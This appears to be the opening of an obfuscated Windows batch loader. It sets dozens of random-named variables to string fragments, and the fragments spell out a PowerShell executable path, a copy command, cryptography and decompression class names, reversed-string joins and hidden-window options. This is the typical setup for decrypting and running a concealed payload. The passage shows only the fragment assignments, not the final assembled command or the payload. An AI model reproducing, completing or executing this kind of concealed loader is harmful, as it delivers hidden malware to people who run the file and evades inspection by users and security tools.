@echo off
set "KIeMbIsjiE=xe"
set "EDMpREHdwB=we"
set "FjFFWinSdN=he"
set "uuHvqiEonG=Wi"
set "ALrxFEzuPf=st"
set "zGIEZUhveh= /"
set "oOpVVvYhtI=1."
set "SvJUNXALCw=em"
set "dyJLNxqYfB=Po"
set "kZtYEtTDGk=nd"
set "GAmmAhjCIk=rS"
set "rBerDHBcdF=ws"
set "rnxyoULGLN=he"
set "BkUHRhUbcR=\W"
set "mvbUMikhWQ=py"
set "RRGjXJYlaZ=.e"
set "ZConlNPOzZ=ll"
set "axFBYCmxkG=\v"
set "CpeIShiQEh= C"
set "InTmRglIkZ=in"
set "cULJcAHnAF=y "
set "RUAZMBiDkq=ll"
set "gceSqtoYIp=:\"
set "TmzHviHJsJ=s\"
set "KQVnFkqiEs=ow"
set "WPHwylntsQ=we"
set "GXDRkqAuPP=do"
set "rPaJBelYaM=0\"
set "IYlzrTHzuL=co"
set "rucJkiDdGt=po"
set "PIvQIkxVZT=rs"
set "CUDXXgJgnW=Sy"
set "LkkXIPmXpy=32"
set "qSWRilAtYh=cd"
set "fgUTrRCSkx= %~dp0"
set "iJXJSYoGcB=onve"
set "EZllCzjDOI=oArr"
set "HwlaSrbdlU=join"
set "mRcjfcGgOR=-1.."
set "buYoZFuhON=.Cry"
set "sGBiXTMkGn=cUbg"
set "FGkVNKZoEe=bjec"
set "CPSUCduTcx=.Con"
set "jLVMKiqopr= = $"
set "mKbGqCxwWU=; };"
set "NWShyrzvpn=Secu"
set "cnFqnysFFR=ress"
set "SHALdgHfbJ=bSe "
set "WLPwPwYtab=EFiZ"
set "mFZwvrNYln=1..-"
set "ZqezQUBekL=s75K"
set "TvKKUSBFNv=ptog"
set "TViSqhezBv=-joi"
set "ErjguBnwTo='gni"
set "QKdVBpIkLq=comp"
set "qONsmRrzrS=ct S"
set "lfIvTdsBHR=zuZI"
set "tFBVOdAvVA=n ''"
set "pblSoSHQhR=ZY, "
set "tyzEFiQppV=[IO."
set "ZVuQftzmRf=6] -"
set "PboLjkLXmF=Syst"
set "QGnpwGzYvF=EobS"
set "mSPRKHgAJZ=S = "
set "FWSXFeZYpE=3); "
set "xTKkuBxAcp=raph"
set "BQbFvGrvQf=BC;$"
set "ehqSJlGzkK=V = "
set "WvLskwNjZI=gMod"
set "elpiJReCKs=form"
set "lqbSqwQCSk=();$"
set "rwBDXvwiaV=-Obj"
set "eUhcBVIVuZ=tsWi"
set "qzXbFVVhRA=)))"
set "KpGjmSYcuT=, (,"
set "sdHACjcwWW=xqll"
set "uBnxEFBMzs=tem."
set "WXfvJTSsSO=IheS"
set "KyWvacZtFv=Stre"
set "UsSlyDocsG=.Cre"
set "oKaOeaJUZV=bSe."
set "jwYiqVZRcC=..-1"
set "SizqffTElu=tem."
set "TvVvpRvvJN=ewLi"
set "AMcOKBaFCe=O.En"
set "KrEjdDPKHG=[Sys"
set "FjXnlaCBNi=.-16"
set "ffMWxgrYXV=e.Su"
set "uDRclemlrF=ne);"
set "MGibJfdJzV=rofi"
set "VugVHoDJiq=n ''"
